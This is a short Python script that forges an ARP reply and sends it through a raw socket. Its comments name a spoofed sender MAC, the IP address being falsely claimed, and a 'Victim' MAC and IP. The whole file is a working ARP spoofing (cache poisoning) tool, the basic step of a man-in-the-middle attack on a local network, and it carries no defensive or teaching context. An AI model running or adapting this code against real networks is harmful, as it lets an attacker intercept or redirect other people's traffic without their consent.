import socket
import struct

def mac_to_bytes(mac):
    return bytes.fromhex(mac.replace(":", ""))

def ip_to_bytes(ip):
    return socket.inet_aton(ip)

# Interface to send on
INTERFACE = "eth0"

# ARP reply info
sender_mac = "aa:bb:cc:dd:ee:ff"   # Your MAC (spoofed or real)
sender_ip  = "192.168.1.100"       # IP you are claiming
target_mac = "11:22:33:44:55:66"   # Victim MAC
target_ip  = "192.168.1.1"         # Victim IP

# Ethernet header
eth_dst = mac_to_bytes(target_mac) # with netaddr
eth_src = mac_to_bytes(sender_mac) # with netaddr
eth_type = struct.pack("!H", 0x0806)  # ARP

ethernet_header = eth_dst + eth_src + eth_type

# ARP payload
arp_payload = struct.pack(
    "!HHBBH6s4s6s4s",
    1,                    # Hardware type (Ethernet)
    0x0800,               # Protocol type (IPv4)
    6,                    # Hardware size
    4,                    # Protocol size
    2,                    # Opcode (2 = reply)
    mac_to_bytes(sender_mac),
    ip_to_bytes(sender_ip),
    mac_to_bytes(target_mac),
    ip_to_bytes(target_ip),
)

packet = ethernet_header + arp_payload

# Send packet
sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
sock.bind((INTERFACE, 0))
sock.send(packet)
sock.close()

print("ARP reply sent")
